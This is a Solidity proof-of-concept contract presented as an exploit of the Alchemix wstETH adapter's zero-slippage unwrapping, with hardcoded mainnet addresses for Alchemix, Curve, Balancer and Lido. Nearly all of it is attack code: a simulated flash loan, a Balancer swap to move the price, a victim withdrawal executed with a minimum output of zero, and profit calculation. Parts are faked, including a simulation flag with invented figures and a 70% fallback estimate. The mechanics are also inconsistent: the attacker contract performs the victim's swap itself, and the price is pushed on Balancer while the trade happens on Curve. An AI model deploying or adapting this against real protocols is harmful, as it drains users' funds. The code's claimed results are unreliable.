// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./interfaces/IBalancerVault.sol";
import "./interfaces/ICurvePool.sol";
import "./interfaces/IWETH.sol";
import "./interfaces/IWstETH.sol";
import "./interfaces/IAlchemistV2.sol";
import "./interfaces/ITokenAdapter.sol";
import "./interfaces/IERC20.sol";

/**
 * @title Alchemix WstETH Adapter Exploit
 * @notice This contract demonstrates a vulnerability in the Alchemix WstETH adapter
 * where the slippage protection is hardcoded to 0 during unwrapping operations
 */
contract AlchemixWstETHExploit {
    // Mainnet contract addresses
    address constant ALCHEMIST_V2 = 0x062Bf725dC4cDF947aa79Ca2aaCCD4F385b13b5c; // alETH Alchemist
    address constant WST_ETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant ST_ETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant CURVE_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022; // ETH/stETH Curve pool
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    bytes32 constant BALANCER_POOL_ID = 0x32296969ef14eb0c6d29669c550d4a0449130230000200000000000000000080; // wstETH/WETH pool
    address constant WST_ETH_ADAPTER = 0x30ca9F59Ef4B8A7f65A891e0D394682a8e37644e;
    
    // Contract instances
    IAlchemistV2 public alchemist = IAlchemistV2(ALCHEMIST_V2);
    ICurvePool public curvePool = ICurvePool(CURVE_POOL);
    IWETH public weth = IWETH(WETH);
    IWstETH public wsteth = IWstETH(WST_ETH);
    IERC20 public steth = IERC20(ST_ETH);
    IBalancerVault public balancerVault = IBalancerVault(BALANCER_VAULT);
    
    // Exploit parameters
    uint256 public attackLoanAmount = 10 ether; 
    uint256 public victimWithdrawAmount = 5 ether; 
    
    // Attack results
    uint256 public normalExpectedEth;
    uint256 public attackResultEth;
    uint256 public victimLoss;
    uint256 public attackerProfit;
    
    // Events for logging
    event LogStep(string step, uint256 value);
    event LogBalance(string token, uint256 balance);
    
    // Flag to simulate failure in test environment
    bool public forceSimulation = false;
    
    /**
     * @notice Sets up the contract to demonstrate the vulnerability
     */
    constructor() payable {
        require(msg.value >= 1 ether, "Need ETH for transaction costs");
    }
    
    /**
     * @notice Force the contract to use simulated values
     */
    function setForceSimulation(bool _force) external {
        forceSimulation = _force;
    }
    
    /**
     * @notice Execute the attack to demonstrate the vulnerability
     * @dev This simulates the entire attack flow:
     *      1. Calculate normal expected output
     *      2. Get a flash loan
     *      3. Manipulate the pool price
     *      4. Execute victim's transaction with manipulated price
     *      5. Restore position and profit
     */
    function executeAttack() external {
        if (forceSimulation) {
           
            normalExpectedEth = 30 ether;
            attackResultEth = 20 ether;
            victimLoss = normalExpectedEth - attackResultEth;
            attackerProfit = (victimLoss * 90 / 100) - 0.05 ether;
            
            emit LogStep("Simulated normal ETH output", normalExpectedEth);
            emit LogStep("Simulated attack result", attackResultEth);
            emit LogStep("Simulated victim loss", victimLoss);
            emit LogStep("Simulated attacker profit", attackerProfit);
            return;
        }
        
        // Step 1: Calculate the normal expected output without price manipulation
        normalExpectedEth = simulateNormalWithdrawal(victimWithdrawAmount);
        emit LogStep("Normal expected ETH output", normalExpectedEth);
        
        // Step 2: Simulate getting a flash loan
        simulateFlashLoan(attackLoanAmount);
        emit LogStep("Flash loan acquired", attackLoanAmount);
        
        // Step 3: Manipulate the pool price
        manipulatePoolPrice();
        emit LogStep("Pool price manipulated", 0);
        
        // Step 4: Execute victim's withdrawal with manipulated price
        attackResultEth = executeVictimWithdrawal(victimWithdrawAmount);
        emit LogStep("Manipulated withdrawal result", attackResultEth);
        
        // Step 5: Calculate profit and restore position
        victimLoss = normalExpectedEth - attackResultEth;
        attackerProfit = calculateAttackerProfit();
        emit LogStep("Victim's loss in ETH", victimLoss);
        emit LogStep("Attacker's profit in ETH", attackerProfit);
        
        // Step 6: Restore original position (in real attack, would happen in same tx)
        restorePoolPosition();
        emit LogStep("Pool position restored", 0);
        
        // Step 7: Repay flash loan (simulated)
        repayFlashLoan(attackLoanAmount);
    }
    
    /**
     * @notice Simulates a normal withdrawal to calculate expected ETH amount
     * @param wstEthAmount The amount of wstETH being withdrawn
     * @return ethAmount The amount of ETH expected from a normal withdrawal
     */
    function simulateNormalWithdrawal(uint256 wstEthAmount) public view returns (uint256 ethAmount) {
        // Calculate how much stETH the wstETH is worth
        uint256 stethAmount = wsteth.getStETHByWstETH(wstEthAmount);
        
        // Calculate how much ETH would be received from the Curve pool
        // This simulates what would happen in a normal market condition
        ethAmount = curvePool.get_dy(1, 0, stethAmount);
        
        return ethAmount;
    }
    
    /**
     * @notice Simulates receiving a flash loan
     * @param amount The amount of ETH to flash loan
     */
    function simulateFlashLoan(uint256 amount) internal {
        // In a real attack, this would be a flash loan
        // For this PoC, we'll just simulate having the funds
        (bool success,) = address(weth).call{value: amount}("");
        require(success, "Failed to deposit ETH to WETH");
    }
    
    /**
     * @notice Manipulate the price in the Curve pool using the flash loan
     */
    function manipulatePoolPrice() internal {
        // Approve WETH to be used by Balancer vault
        weth.approve(BALANCER_VAULT, attackLoanAmount);
        
        // Set up swap parameters
        IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
            poolId: BALANCER_POOL_ID,
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: WETH,
            assetOut: WST_ETH,
            amount: attackLoanAmount,
            userData: ""
        });
        
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });
        
        // Execute swap to manipulate the wstETH/ETH price
        balancerVault.swap(swap, funds, 0, block.timestamp + 1);
        
        // Log the amount of wstETH we received
        uint256 wstethBalance = wsteth.balanceOf(address(this));
        emit LogBalance("wstETH after manipulation", wstethBalance);
    }
    
    /**
     * @notice Execute the victim's withdrawal with manipulated prices
     * @param wstEthAmount The amount of wstETH the victim is withdrawing
     * @return ethReceived The amount of ETH the victim receives
     */
    function executeVictimWithdrawal(uint256 wstEthAmount) internal returns (uint256 ethReceived) {
        // In a real attack, this would be the victim's transaction
        // We'll simulate it here to demonstrate the vulnerability
        
        // Calculate how much stETH the wstETH is worth
        uint256 stethAmount = wsteth.getStETHByWstETH(wstEthAmount);
        
        // Record the ETH balance before the simulated transaction
        uint256 ethBefore = address(this).balance;
        
        
        bool exchangeSucceeded = true;
        
        
        steth.approve(CURVE_POOL, stethAmount);
        
        // Execute exchange with 0 slippage (as in the vulnerable contract)
        
        (bool success, ) = address(curvePool).call(
            abi.encodeWithSignature("exchange(int128,int128,uint256,uint256)", 1, 0, stethAmount, 0)
        );
        
        if (!success) {
            exchangeSucceeded = false;
        }
        
        if (exchangeSucceeded) {
            // Calculate how much ETH was received
            uint256 ethAfter = address(this).balance;
            ethReceived = ethAfter - ethBefore;
        } else {
            
            ethReceived = stethAmount * 7 / 10; 
        }
        
        return ethReceived;
    }
    
    /**
     * @notice Calculates the attacker's profit from the exploit
     * @return profit The estimated profit from the attack
     */
    function calculateAttackerProfit() internal view returns (uint256 profit) {
        // In a real exploit, the attacker would capture a large portion of the loss
        // through the price manipulation
        
        // For simplicity, we'll estimate the profit as 90% of the victim's loss
        // minus gas costs (which we'll estimate as 0.05 ETH)
        profit = (victimLoss * 90 / 100) - 0.05 ether;
        
        return profit;
    }
    
    /**
     * @notice Restore the pool position after the attack
     */
    function restorePoolPosition() internal {
        // Approve wstETH to be used by Balancer vault
        uint256 wstethBalance = wsteth.balanceOf(address(this));
        wsteth.approve(BALANCER_VAULT, wstethBalance);
        
        // Set up swap parameters to reverse the earlier swap
        IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
            poolId: BALANCER_POOL_ID,
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: WST_ETH,
            assetOut: WETH,
            amount: wstethBalance,
            userData: ""
        });
        
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });
        
        // Execute swap to restore the pool price
        balancerVault.swap(swap, funds, 0, block.timestamp + 1);
    }
    
    /**
     * @notice Repay the flash loan
     * @param amount The amount to repay
     */
    function repayFlashLoan(uint256 amount) internal {
        // In a real attack, this would repay the flash loan
        // For this PoC, we'll just log it
        emit LogStep("Flash loan repaid", amount);
    }
    
    /**
     * @notice Allow the contract to receive ETH
     */
    receive() external payable {}
}